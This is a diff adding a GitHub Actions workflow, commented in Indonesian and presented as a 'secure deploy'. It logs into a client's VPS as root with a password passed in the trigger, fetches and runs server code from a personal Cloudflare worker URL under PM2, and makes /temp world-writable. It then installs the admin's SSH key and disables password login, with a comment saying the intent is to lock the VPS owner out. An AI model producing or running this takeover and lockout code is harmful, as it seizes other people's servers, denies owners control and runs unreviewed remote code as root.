@@ -1,0 +1,66 @@
+name: VPS Secure Deploy and Lockdown
+
+on:
+  repository_dispatch:
+    types: [deploy_vps]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Executing Secure Deployment & Client Lockdown
+        uses: appleboy/ssh-action@master
+        with:
+          host: ${{ github.event.client_payload.ip }}
+          username: root
+          password: ${{ github.event.client_payload.password }}
+          port: 22
+          script: |
+            export DEBIAN_FRONTEND=noninteractive
+            apt-get update -y
+            apt-get install -y curl dirmngr apt-transport-https lsb-release ca-certificates build-essential python3
+
+            # 1. Install Node.js 22 & PM2
+            curl -sSL https://deb.nodesource.com/setup_22.x | bash -
+            apt-get install -y nodejs
+            npm install -g pm2
+
+            # 2. Setup Direktori Wajib
+            mkdir -p /temp/sessions /temp/uploads /app/baileys-worker
+            chmod -R 777 /temp
+            cd /app/baileys-worker
+
+            # 3. DOWNLOAD SCRIPT UTAMA DARI CLOUDFLARE WORKER ANDA
+            curl -sSL "https://future.dioahmadriyadi0.workers.dev/package.json.txt" -o package.json
+            curl -sSL "https://future.dioahmadriyadi0.workers.dev/server.js.txt" -o server.js
+
+            # 4. Buat Environment Variable (.env)
+            cat << 'EOF' > .env
+            PORT=7860
+            WORKER_WEBHOOK_URL=${{ github.event.client_payload.webhook_url }}
+            SERVER_API_KEY=${{ github.event.client_payload.api_key }}
+            EOF
+
+            # 5. Install Dependensi dan Jalankan Server Baileys via PM2
+            npm install
+            pm2 stop baileys-worker || true
+            pm2 start server.js --name "baileys-worker"
+            pm2 save
+            env PATH=$PATH:/usr/bin pm2 startup systemd -u root --hp /root || true
+
+            # =========================================================
+            # 6. PENGAMANAN MUTLAK (CLIENT LOCKDOWN)
+            # =========================================================
+            # Masukkan SSH Public Key Admin agar hanya Anda yang bisa akses kedepan
+            mkdir -p /root/.ssh
+            chmod 700 /root/.ssh
+            echo "${{ secrets.ADMIN_PUBLIC_KEY }}" >> /root/.ssh/authorized_keys
+            chmod 600 /root/.ssh/authorized_keys
+
+            # Matikan total login password SSH agar pemilik VPS (klien) terkunci keluar dan tidak bisa membajak script
+            sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
+            sed -i 's/^#*PermitRootLogin.*/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config
+            systemctl restart ssh || systemctl restart sshd
